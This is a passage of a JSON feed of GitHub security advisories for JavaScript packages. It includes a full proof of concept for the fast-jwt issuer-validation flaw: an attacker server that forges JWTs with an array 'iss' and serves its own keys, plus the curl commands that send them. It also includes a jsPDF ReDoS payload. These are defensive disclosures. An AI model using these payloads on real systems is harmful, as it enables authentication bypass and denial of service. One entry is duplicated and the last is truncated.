            "title": "[nuxt] Nuxt allows DOS via cache poisoning with payload rendering response",
            "date_modified": "2025-03-20T19:31:05.000Z",
            "date_published": "2025-03-19T19:54:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jvhm-gjrh-3h93"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>fast-jwt</code> library does not properly validate the <code>iss</code> claim based on the RFC <a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a>.</p>\n<h4 id=\"details\">Details</h4>\n<p>The <code>iss</code> (issuer) claim validation within the fast-jwt library permits an array of strings as a valid <code>iss</code> value. This design flaw enables a potential attack where a malicious actor crafts a JWT with an <code>iss</code> claim structured as <code>['https://attacker-domain/', 'https://valid-iss']</code>. Due to the permissive validation, the JWT will be deemed valid.</p>\n<p>Furthermore, if the application relies on external libraries like <code>get-jwks</code> that do not independently validate the <code>iss</code> claim, the attacker can leverage this vulnerability to forge a JWT that will be accepted by the victim application. Essentially, the attacker can insert their own domain into the <code>iss</code> array, alongside the legitimate issuer, and bypass the intended security checks.</p>\n<h4 id=\"poc\">PoC</h4>\n<p>Take a server running the following code:</p>\n<pre><code class=\"language-js\">const express = require('express')\nconst buildJwks = require('get-jwks')\nconst { createVerifier } = require('fast-jwt')\n\nconst jwks = buildJwks({ providerDiscovery: true });\nconst keyFetcher = async (jwt) =&gt;\n    jwks.getPublicKey({\n        kid: jwt.header.kid,\n        alg: jwt.header.alg,\n        domain: jwt.payload.iss\n    });\n\n\nconst jwtVerifier = createVerifier({\n    key: keyFetcher,\n    allowedIss: 'https://valid-iss',\n});\n\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n\nasync function verifyToken(req, res, next) {\n  const headerAuth = req.headers.authorization.split(' ')\n  let token = '';\n  if (headerAuth.length &gt; 1) {\n    token = headerAuth[1];\n  }\n\n  const payload = await jwtVerifier(token);\n\n  req.decoded = payload;\n  next();\n}\n\n// Endpoint to check if you are auth or not\napp.get('/auth', verifyToken, (req, res) =&gt; {\n  res.json(req.decoded);\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Server is running on port ${port}`);\n});\n</code></pre>\n<p>Now we build a server that will be used to generate the JWT token and send the verification keys to the victim server:</p>\n<pre><code class=\"language-js\">const { generateKeyPairSync } = require('crypto');\nconst express = require('express');\nconst pem2jwk = require('pem2jwk');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\nconst port = 3001;\nconst host = `http://localhost:${port}/`;\n\nconst { publicKey, privateKey } = generateKeyPairSync(\"rsa\", \n    {   modulusLength: 4096,\n        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },\n        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },\n    },\n); \nconst jwk = pem2jwk(publicKey);\n\napp.use(express.json());\n\n// Endpoint to create token\napp.post('/create-token', (req, res) =&gt; {\n  const token = jwt.sign({ ...req.body, iss: [host, 'https://valid-iss'],  }, privateKey, { algorithm: 'RS256' });\n  res.send(token);\n});\n\napp.get('/.well-known/jwks.json', (req, res) =&gt; {\n    return res.json({\n        keys: [{\n            ...jwk,\n            alg: 'RS256',\n            use: 'sig',\n        }]\n    });\n})\n\napp.all('*', (req, res) =&gt; {\n    return res.json({\n        \"issuer\": host,\n        \"jwks_uri\": host + '.well-known/jwks.json'\n    });\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Server is running on port ${port}`);\n});\n</code></pre>\n<pre><code class=\"language-bash\">export TOKEN=$(curl -X POST http://localhost:3001/create-token -H \"Content-Type: application/json\" -d '{\"name\": \"test\"}')\ncurl -X GET http://localhost:3000/auth -H \"Authorization: Bearer $TOKEN\"\n</code></pre>\n<h4 id=\"impact\">Impact</h4>\n<p>Applications relaying on the validation of the <code>iss</code> claim by fast-jwt allows attackers to sign arbitrary payloads which will be accepted by the verifier.</p>\n<h4 id=\"solution\">Solution</h4>\n<p>Change <a href=\"https://github.com/nearform/fast-jwt/blob/d2b0ccb103848917848390f96f06acee339a7a19/src/verifier.js#L475\">https://github.com/nearform/fast-jwt/blob/d2b0ccb103848917848390f96f06acee339a7a19/src/verifier.js#L475</a> to a validator tha accepts only string for the value as stated in the RFC <a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nearform/fast-jwt/security/advisories/GHSA-gm45-q3v2-6cf8\">https://github.com/nearform/fast-jwt/security/advisories/GHSA-gm45-q3v2-6cf8</a></li>\n<li><a href=\"https://github.com/nearform/fast-jwt/commit/cc26b1d473f900446ad846f8f0b10eb1c0adcbdd\">https://github.com/nearform/fast-jwt/commit/cc26b1d473f900446ad846f8f0b10eb1c0adcbdd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30144\">https://nvd.nist.gov/vuln/detail/CVE-2025-30144</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7519#page-9\">https://datatracker.ietf.org/doc/html/rfc7519#page-9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gm45-q3v2-6cf8\">https://github.com/advisories/GHSA-gm45-q3v2-6cf8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gm45-q3v2-6cf8",
            "title": "[fast-jwt] Fast-JWT Improperly Validates iss Claims",
            "date_modified": "2025-03-20T18:58:43.000Z",
            "date_published": "2025-03-19T15:48:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gm45-q3v2-6cf8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>User control of the first argument of the <code>addImage</code> method results in CPU utilization and denial of service.</p>\n<p>If given the possibility to pass unsanitized image urls to the <code>addImage</code> method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.</p>\n<p>Other affected methods are: <code>html</code>, <code>addSvgAsImage</code>.</p>\n<p>Example payload:</p>\n<pre><code class=\"language-js\">import { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@&gt;=3.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Sanitize image urls before passing it to the <code>addImage</code> method or one of the other affected methods.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Researcher: Aleksey Solovev (Positive Technologies)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj\">https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj</a></li>\n<li><a href=\"https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df\">https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29907\">https://nvd.nist.gov/vuln/detail/CVE-2025-29907</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w532-jxjh-hjhj\">https://github.com/advisories/GHSA-w532-jxjh-hjhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj",
            "title": "[jspdf] jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
            "date_modified": "2025-03-19T05:58:36.000Z",
            "date_published": "2025-03-18T21:07:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Uptime Kuma &gt;== 1.23.0 has a ReDoS vulnerability, specifically when an administrator creates a notification through the web service. If a string is provided it triggers catastrophic backtracking in the regular expression, leading to a ReDoS attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26042\">https://nvd.nist.gov/vuln/detail/CVE-2025-26042</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/issues/5574\">https://github.com/louislam/uptime-kuma/issues/5574</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/commit/7a9191761dbef6551c2a0aa6eed5f693ba48d688\">https://github.com/louislam/uptime-kuma/commit/7a9191761dbef6551c2a0aa6eed5f693ba48d688</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3rw8-4xrq-3f7p\">https://github.com/advisories/GHSA-3rw8-4xrq-3f7p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3rw8-4xrq-3f7p",
            "title": "[uptime-kuma] Uptime Kuma ReDoS vulnerability",
            "date_modified": "2025-03-20T19:28:30.000Z",
            "date_published": "2025-03-17T21:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3rw8-4xrq-3f7p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Desktop App versions &lt;=5.10.0 explicitly declared unnecessary macOS entitlements which allows an attacker with remote access to bypass Transparency, Consent, and Control (TCC) via code injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1398\">https://nvd.nist.gov/vuln/detail/CVE-2025-1398</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xmvv-w44w-j8wx\">https://github.com/advisories/GHSA-xmvv-w44w-j8wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xmvv-w44w-j8wx",
            "title": "[mattermost-desktop] Mattermost Desktop App allows the bypass of Transparency, Consent, and Control (TCC) via code injection",
            "date_modified": "2025-03-17T21:27:35.000Z",
            "date_published": "2025-03-17T15:31:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xmvv-w44w-j8wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in canvg prior to v.4.0.3 and v3.0.11 can lead to prototype pollution via the Constructor of the class StyleElement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25977\">https://nvd.nist.gov/vuln/detail/CVE-2025-25977</a></li>\n<li><a href=\"https://github.com/canvg/canvg/issues/1749\">https://github.com/canvg/canvg/issues/1749</a></li>\n<li><a href=\"https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts\">https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts</a></li>\n<li><a href=\"https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d\">https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v2mw-5mch-w8c5\">https://github.com/advisories/GHSA-v2mw-5mch-w8c5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5",
            "title": "[canvg] canvg Prototype Pollution vulnerability",
            "date_modified": "2025-03-17T15:41:45.000Z",
            "date_published": "2025-03-10T18:31:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in canvg prior to v.4.0.3 and v3.0.11 can lead to prototype pollution via the Constructor of the class StyleElement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25977\">https://nvd.nist.gov/vuln/detail/CVE-2025-25977</a></li>\n<li><a href=\"https://github.com/canvg/canvg/issues/1749\">https://github.com/canvg/canvg/issues/1749</a></li>\n<li><a href=\"https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts\">https://github.com/canvg/canvg/blob/937668eced93e0335c67a255d0d2277ea708b2cb/src/Document/StyleElement.ts</a></li>\n<li><a href=\"https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d\">https://github.com/canvg/canvg/commit/c3743e6345f3e01aefdcdd412c3f26494f4b5d7d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v2mw-5mch-w8c5\">https://github.com/advisories/GHSA-v2mw-5mch-w8c5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5",
            "title": "[canvg] canvg Prototype Pollution vulnerability",
            "date_modified": "2025-03-17T15:41:45.000Z",
            "date_published": "2025-03-10T18:31:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v2mw-5mch-w8c5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in parse-git-config v.3.0.0 allows an attacker to obtain sensitive information via the expandKeys function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25975\">https://nvd.nist.gov/vuln/detail/CVE-2025-25975</a></li>\n<li><a href=\"https://github.com/jonschlinkert/parse-git-config/issues/14\">https://github.com/jonschlinkert/parse-git-config/issues/14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8g77-54rh-46hx\">https://github.com/advisories/GHSA-8g77-54rh-46hx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8g77-54rh-46hx",
            "title": "[parse-git-config] Prototype Pollution Vulnerability in parse-git-config",
            "date_modified": "2025-03-20T19:27:24.000Z",
            "date_published": "2025-03-12T21:31:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8g77-54rh-46hx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>XSS vulnerability when the sanitizer is used with a <code>contentEditable</code> element to set the elements <code>innerHTML</code> to a sanitized string produced by the package. If the code is particularly crafted to abuse the code beautifier, that runs AFTER sanitation.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in version 2.0.3</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jitbit/HtmlSanitizer/security/advisories/GHSA-vhv4-fh94-jm5x\">https://github.com/jitbit/HtmlSanitizer/security/advisories/GHSA-vhv4-fh94-jm5x</a></li>\n<li><a href=\"https://github.com/jitbit/HtmlSanitizer/commit/af6d2a78877e7277cd01c825b7fb50edb5956963\">https://github.com/jitbit/HtmlSanitizer/commit/af6d2a78877e7277cd01c825b7fb50edb5956963</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29771\">https://nvd.nist.gov/vuln/detail/CVE-2025-29771</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vhv4-fh94-jm5x\">https://github.com/advisories/GHSA-vhv4-fh94-jm5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vhv4-fh94-jm5x",
            "title": "[@jitbit/htmlsanitizer] JS Html Sanitizer allows XSS when used with contentEditable",
            "date_modified": "2025-03-14T21:41:27.000Z",
            "date_published": "2025-03-14T19:54:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vhv4-fh94-jm5x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Inconsistent </p>",
            "url": "https://github.com/advisories/GHSA-549p-5c7f-c5p4",
            "title": "[froala-editor] Froala WYSIWYG editor allows cross-site scripting (XSS)",
            "date_modified": "2025-03-14T18:51:50.000Z",
            "date_published": "2024-11-08T00:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-549p-5c7f-c5p4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}